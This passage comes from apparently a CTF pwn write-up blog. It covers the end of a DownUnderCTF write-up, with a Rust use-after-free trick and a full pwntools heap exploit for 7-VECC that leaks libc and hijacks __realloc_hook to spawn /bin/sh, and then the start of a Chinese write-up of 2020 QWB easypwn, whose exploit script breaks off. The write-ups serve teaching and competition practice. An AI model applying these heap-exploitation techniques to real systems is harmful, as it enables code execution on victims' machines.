<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&quot;infect&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>This will create a pointer to a 32 byte piece of freed memory and then store that in the <code>infected</code> variable in main.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&quot;eat brains                     &quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Since the <code>.trim()</code> is called on each line before it is compared against the instructions, the trailing whitespace in this command will be ignored and the command recognised as “eat brains”.</p>
<p>The purpose of the trailing whitespace here is to force the line containing this command to allocate a 32 byte buffer to store the command. This will take the buffer we have previously freed and have a dangling reference to back out of the freed bins and use it as part of the string buffer.</p>
<p>Now we have also entered the “eat brains” function at the same time, so we are able to modify the buffer that now contains the “eat brains                     “ string.</p>
<p>The final piece of this puzzle is understanding how strings work in rust. Unlike in C, rust strings are not null terminated, instead the length of the string is stored alongside the pointer to the string and therefore in this case we do not have control over the length of the string.</p>
<p>If we simply replaced the first few bytes of the command buffer with the command we wanted and a null terminator we would end up with:<br>“get flag\x00s                     “</p>
<p>When this is <code>.trim()</code>ed the result would be “get flag\x00s” which would not match the required string “get flag”. Instead we overwrite a few more bytes of the command with the space character:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brains</span>(<span class="params">string</span>):</span></span><br><span class="line">	counter = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">		p.sendline(<span class="built_in">str</span>(counter))</span><br><span class="line">		p.sendline(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)))</span><br><span class="line">		counter += <span class="number">1</span></span><br><span class="line">	p.sendline(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line">brains(<span class="string">&quot;get flag  &quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Note the additional spaces at the end of the command, this will overwrite the “ns” in “brains” and cause the <code>.trim()</code> method to trim the command down to “get flag”, which then prints the flag.</p>
<h2 id="7-VECC"><a href="#7-VECC" class="headerlink" title="7-VECC"></a>7-VECC</h2><p>This is a hard heap exploitation challenge.</p>
<p>The idea is to first obtain a read/write primitive on the heap, then progressively leak data until you know the location of libc, then overwrite the <code>__realloc_hook</code> to call <code>system(/bin/sh)</code>.</p>
<h3 id="1-Identifying-the-vulnerability"><a href="#1-Identifying-the-vulnerability" class="headerlink" title="1 - Identifying the vulnerability"></a>1 - Identifying the vulnerability</h3><p>The first thing to note when inspecting the binary logic is that bounds are being checked correctly so we have no buffer overflows or heap corruption, and there are no obvious double-frees or use-after-frees, however there is the glaring vulnerability that allocations are never zeroed and we must leverage this and only this to get a shell.</p>
<h3 id="2-The-essence-of-the-vulnerability"><a href="#2-The-essence-of-the-vulnerability" class="headerlink" title="2 - The essence of the vulnerability"></a>2 - The essence of the vulnerability</h3><p>For this exploit all you need is the tcache. There are the <code>vecc</code>s - which are simillar to c++’s <code>std::vector</code> or rust’s <code>Vec</code>. This is a small struct with a pointer (to a buffer), a length (of the used portion of the buffer), and a capacity (the maximum buffer length before reallocation is necessary). When a vecc is first created all fields should be NULLed to signal that a new buffer must be allocated upon first usage.</p>
<p>The key here is to notice that since allocations are not zeroed it is possible to groom the stack, then allocate a vecc from a tcache chunk without erasing the data on it.</p>
<p>This means that your allocated struct will leave the pointer as the <code>fd</code> pointer of the chunk from the tcache, as well as leaving the length and capacity unchanged from when the chunk was freed.</p>
<p>Furthermore since we have some control over the stack, it is possible to force this chunk <code>fd</code> pointer to point to another vecc struct as if it was the buffer of our new allocation.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> A                  B</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br><span class="line">| buf +----------&gt; | buf +----------&gt; | actual    |</span><br><span class="line">+-----+-----+      +-----+-----+      | buffer    |</span><br><span class="line">| len | cap |      | len | cap |      |           |</span><br><span class="line">+-----+-----+      +-----+-----+      +-----------+</span><br></pre></td></tr></table></figure>

<p>Once we have the above structure we are free to use A to overwrite all 3 fields of B as if it was a regular byte buffer, then use B to read or write data at will.</p>
<p>This is made a little more difficult in that we do not have arbitrary write on the buffer of any of our veccs, instead we only have the ability to clear and append to the buffers.</p>
<p>The clear operation simply zeroes the <code>len</code> field of the struct and does nothing else.</p>
<p>The append operation is a little more complicated, it:</p>
<ul>
<li>Allocates a temporary buffer of user defined size n</li>
<li>Reads n bytes into the temporary buffer</li>
<li>Checks whether <code>len</code> + n &gt; <code>cap</code> - this would overflow the buffer</li>
<li>If necessary reallocates the vecc’s buffer to the next power of 2 size that would fit the existing buffer and the n new bytes while copying the data across, <code>cap</code> it also updated</li>
<li>Append the user data from the temporary buffer to the vecc’s buffer now that we’re sure we can not overflow it</li>
<li>Free the temporary buffer</li>
<li>Update the <code>len</code> to reflect the size of the new used portion of the buffer</li>
</ul>
<p>The end result is that a temp buffer is allocated and freed, and the vecc’s buffer is possibly reallocated to fit the required size, then the user data is appended to the vecc’s existing data.</p>
<p>Once we have our crafted heap structure we can use a clear, followed by an append to overwrite the entire vecc struct at will.</p>
<h3 id="3-The-exploit"><a href="#3-The-exploit" class="headerlink" title="3 - The exploit"></a>3 - The exploit</h3><p>For this exploit we first do some housekeeping since we have a shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_proc</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_vecc</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy_vecc</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_vecc</span>(<span class="params">index, buffer, readline=<span class="literal">True</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(buffer)))</span><br><span class="line">	p.send(buffer)</span><br><span class="line">	<span class="keyword">if</span> readline:</span><br><span class="line">		p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_vecc</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_vecc</span>(<span class="params">index, <span class="built_in">bytes</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">	<span class="keyword">return</span> p.recv(<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;localhost&quot;, 1337)</span></span><br><span class="line">p = process(<span class="string">&quot;../publish/vecc&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>This simply reflects all of the shell commands we might need to use. Now lets get to grooming the heap for our primitive.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create_vecc(<span class="number">0</span>)</span><br><span class="line">append_vecc(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p>We first create a vecc struct then append bytes to it.</p>
<p>It is important to write 0x10 bytes to this buffer since our aim is to have this buffer later interpreted as a vecc struct. For this to work we must make sure that it will be placed in the same tcache bin as a vecc struct would and therefore we should match the size of the vecc struct.</p>
<p>Note that this will also allocate and free a temporary buffer of size 0x10 while user data is read in, we now have 1 chunk in the tcache.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destroy_vecc(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>After this line first the vecc’s buffer will be freed, then the vecc will be NULLed and freed.</p>
<p>Now the tcache looks like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcachebin:</span><br><span class="line"></span><br><span class="line">(was vecc)         (was buffer)       (was temp)</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br><span class="line">| fd  +----------&gt; | fd  +----------&gt; | fd &#x3D; NULL |</span><br><span class="line">| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |</span><br><span class="line">| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br></pre></td></tr></table></figure>

<p>Finally we complete our crafted structure:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_vecc(<span class="number">1</span>)</span><br><span class="line">create_vecc(<span class="number">2</span>)</span><br><span class="line">create_vecc(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>Now we have allocated back from the tcache with some new structure:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 1                  2                  3</span><br><span class="line">+-----------+      +-----------+      +-----------+</span><br><span class="line">| buf +----------&gt; | buf +----------&gt; | buf &#x3D; NULL|</span><br><span class="line">+-----+-----+      +-----+-----+      +-----+-----|</span><br><span class="line">| 000 | 000 |      | AAA | AAA |      | AAA | AAA |</span><br><span class="line">+-----+-----+      +-----+-----+      +-----------+</span><br></pre></td></tr></table></figure>

<p>Since 1 has capacity 0 any write will resule in a reallocation, so we don’t touch 1 from now on, but now with 2 and 3 we have the same structure as in the original diagram - we are able to use 2 to overwrite the entire of 3, then utilise 3 for arbitrary read / write.</p>
<p>Now we know we have PIE disabled, therefore we are able to leak libc addresses from the GOT.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">puts_got = <span class="number">0x601fa0</span></span><br><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(puts_got) + p32(<span class="number">8</span>) + <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">puts_libc = u64(show_vecc(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Puts address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_libc)))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x601f90</span></span><br><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(free_got) + p32(<span class="number">8</span>) + <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">free_libc = u64(show_vecc(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Free address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_libc)))</span><br></pre></td></tr></table></figure>

<p>This is enough to figure out the version of libc being used and the location of any other symbols needed.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_libc - <span class="number">0x809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line">realloc_hook = libc_base + <span class="number">0x3ebc28</span></span><br><span class="line">str_bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Realloc hook address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(realloc_hook)))</span><br></pre></td></tr></table></figure>

<p>Now we overwrite our realloc hook with the address of <code>system</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(realloc_hook) + p32(<span class="number">0</span>) + <span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">append_vecc(<span class="number">3</span>, p64(system))</span><br></pre></td></tr></table></figure>

<p>Finally, we overwrite the buffer pointer of one of our vecc structures with a pointer to “/bin/sh” from within libc, then trigger a reallocation by appending a single extra byte, giving us a shell.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clear_vecc(<span class="number">2</span>)</span><br><span class="line">append_vecc(<span class="number">2</span>, p64(str_bin_sh) + p32(<span class="number">8</span>) + p32(<span class="number">8</span>))</span><br><span class="line">append_vecc(<span class="number">3</span>, <span class="string">&quot;A&quot;</span>, readline=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/22/wp-down-under-ctf/" data-id="ckhemv84q005nwdcm92wmb3tv" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-2020-qwb-easypwn" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/16/wp-2020-qwb-easypwn/" class="article-date">
  <time datetime="2020-09-16T09:25:21.000Z" itemprop="datePublished">2020-09-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/16/wp-2020-qwb-easypwn/">wp 2020强网杯 easypwn</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h1><p>现在重新复现了下以前没做出来的easypwn, 里面涉及的知识点的确经典….^_^…</p>
<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>2020 强网杯</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>6 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enable</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有三个功能, 添加, 编辑, 删除, 设置了global_max_fast的大小, 释放内存没法构成fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_ACE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )                         <span class="comment">// set not malloc as fastbin</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_n</span><span class="params">(__int64 ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> _i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">-1</span>; ; *(_BYTE *)(ptr + i) = buf )</span><br><span class="line">  &#123;</span><br><span class="line">    _i = i;</span><br><span class="line">    <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(size + <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( size - <span class="number">1</span> == _i )</span><br><span class="line">    &#123;</span><br><span class="line">      buf = <span class="number">0</span>;                                  <span class="comment">// vul off by null</span></span><br><span class="line">      *(_BYTE *)(ptr + ++i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在输入的函数中存在off by null漏洞</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>global_max_fast, unsorted bin attack, fastbin attack, parital write, io file, hook hijack</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用parital write和unsorted bin attack 修改 global_max_fast值为比较大的值, 一般为main_arena + 0x58, 该值一般符合0x7f以内, 所以可以采用该方法恢复, fastbin attack攻击条件, 利用parital write和fastbin attack 打入IO_2_1_stdout, 然后泄漏libc, 最后再利用fastbin attack 打入 malloc_hook - 0x23修改malloc_hook, realloc来调整execve第二个参数, 打通几率  1/ 16 * 1 / 16 = 1 / 256</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : 